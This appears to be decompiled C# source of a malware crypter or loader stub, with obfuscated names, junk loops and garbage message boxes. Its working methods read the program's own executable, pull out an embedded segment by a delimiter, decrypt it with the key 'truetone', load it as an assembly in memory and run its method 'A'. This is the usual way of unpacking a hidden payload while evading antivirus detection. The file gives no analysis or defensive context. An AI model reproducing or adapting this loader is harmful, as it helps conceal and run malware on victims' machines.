using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Application1;

[StandardModule]
internal sealed class IyR14c9kWFV6Rb9W0v62e17
{
	public static object blp4s5QWPWspZw5()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 30194801; i <= 1; i = checked(i + 1))
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				while (true)
				{
				}
			}
		}
		Interaction.MsgBox((object)"D‡tm‚†D%g\\BŽ/ˆGWZ†4mA$\u0090MrNrW'2v[z’\u008f@HS’Bs]LX‚€! ‚n&Jxb?ŠF\u008dT4\u007f‘Tyy3/Œ&.&†2M`Zcˆƒ`qV7Wp1QoIZ^\u0081Su(froq(Œtg28JxFQ*†UHy\u0090)g0r<o,`HCŒ~R\u009054‚h\\V‚]ŒjN‹#cNjK*Ž*\\+^‘\u007f=g&|‡P6EH<‰$€\u007fB-^mXD", (MsgBoxStyle)0, (object)null);
		return 70554751;
	}

	public static void zRfYxLXvxDUGV()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("†=R^\u008f`mLz|^%4#t\u0081_od]$ˆp-sd{‡`0-JXXˆ\u0090}b\u0081$\u007f\\qLJk\\*qN‰*E,g‘`D}Jwy~jn4_n.w#\u008f\u0081_p[7Du((p52:#$K„‰PYxV@&p&p6+\u0081ŽŒJŒ<xO,y<auB'clPk/4}7F]7J?j}0f_");
		MessageBox.Show("‰*4&g’KAF7@5u\u0090:Ih\u008dIVK]9]P;‰9.rM.\u007fYjc=\\†1o;Lm'[3fsrJi70FL„iiK(22f|2I;Fj,,&8z/0^V‡(BYOGw‰n2=rf…Z(\\(x„ˆ1Š@(f>b‘I6;E3tCylu?%;m((‹X9_0='Km`v0!P|)5ŠE\u008f");
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(410073221L);
			int num = 41;
			do
			{
				num = checked(num + 1);
			}
			while (num <= 71273);
			ProjectData.ClearProjectError();
		}
	}

	public static void Itrin(bool xyz)
	{
		Thread.Sleep(10);
		string[] array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "Z23718AZheLjqkYTDrtV", -1, (CompareMethod)0);
		byte[] bytes = Encoding.Default.GetBytes(LK45aYSpMJ.R_(array[18], "truetone"));
		Rm(bytes, new object[0]);
	}

	public static object e1LRUeIy6YOv04bIm2lgOk()
	{
		while (true)
		{
		}
	}

	public static object Rm(byte[] AssemblyName, object[] args)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass && type.FullName!.EndsWith(".A"))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
			}
		}
		object result = default(object);
		return result;
	}
}
